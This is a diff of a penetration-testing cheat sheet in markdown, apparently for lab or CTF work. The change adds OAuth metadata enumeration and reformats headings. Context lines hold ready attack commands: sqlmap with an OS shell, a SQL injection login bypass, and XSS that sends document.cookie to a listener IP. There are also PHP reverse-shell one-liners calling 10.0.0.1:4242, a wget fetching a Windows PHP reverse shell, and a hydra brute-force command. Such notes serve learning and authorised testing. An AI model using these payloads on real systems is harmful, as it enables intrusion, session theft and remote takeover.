@@ -42,17 +42,31 @@
 ##################################################################
 -->
 
+## OAuth
+
+#### Enumerating Metadata
+
+**Find OAuth Server URL and make requests below**
+`GET /.well-known/oauth-authorization-server`
+`GET /.well-known/openid-configuration`
+**EXAMPLE** `curl https://accounts.google.com/.well-known/openid-configuration`
+
+<!--
+##################################################################
+##################################################################
+-->
+
 ## SQLI
 
-### Test for SQLI with SQLMAP Using Cookie
+#### Test for SQLI with SQLMAP Using Cookie
 
 `sqlmap -u 'http://website.address?field=to-test' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls"`
 
-### Use SQLMAP to Get Shell
+#### Use SQLMAP to Get Shell
 
 `sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=802vjt3crnju4eg3ib0q04ge9v" --os-shell`
 
-### Bypass Authentication with SQL Injection
+#### Bypass Authentication with SQL Injection
 
 `' or 1=1 --`
 
@@ -83,11 +97,11 @@
 
 ## XSS
 
-### Test for XSS
+#### Test for XSS
 
 `Hello!<script>alert("Welcome");</script>`
 
-### XSS Cookie Hijacking
+#### XSS Cookie Hijacking
 
 _Start XSS-cookie-stealer.py \*\*\*https://raw.githubusercontent.com/lnxg33k/misc/master/XSS-cookie-stealer.py_
 
@@ -108,20 +122,20 @@ i.src="http://172.30.10.210:8888/?"+document.cookie;
 
 ## [SQLite](https://www.sqlitetutorial.net/sqlite-commands/)
 
-### Access Database
+#### Access Database
 
 `sqlite3 databasename.db`
 
-### Show Tables
+#### Show Tables
 
 `.tables`
 
-### Show Table Info
+#### Show Table Info
 
 `PRAGMA table_info(tablename);`
 `.schema tablename`
 
-### Dump Info From Table
+#### Dump Info From Table
 
 `SELECT * FROM customers;`
 `.dump tablename`
@@ -133,7 +147,7 @@ i.src="http://172.30.10.210:8888/?"+document.cookie;
 
 ## Shells
 
-### PHP
+#### PHP
 
 `php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'`
 
@@ -149,7 +163,7 @@ i.src="http://172.30.10.210:8888/?"+document.cookie;
 
 `php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`
 
-### Windows PHP Reverse Shell
+#### Windows PHP Reverse Shell
 
 `wget https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php`
 
@@ -160,7 +174,7 @@ i.src="http://172.30.10.210:8888/?"+document.cookie;
 
 ## Brute Forcing
 
-### Web Login
+#### Web Login
 
 `hydra -L /home/n0m4d1k/usernames -P /usr/share/wordlists/rockyou.txt -t 16 172.30.73.80 http-post-form "/login.php:username=^USER^&password=^PASS^&action=Login:Incorrect username or password"`
 
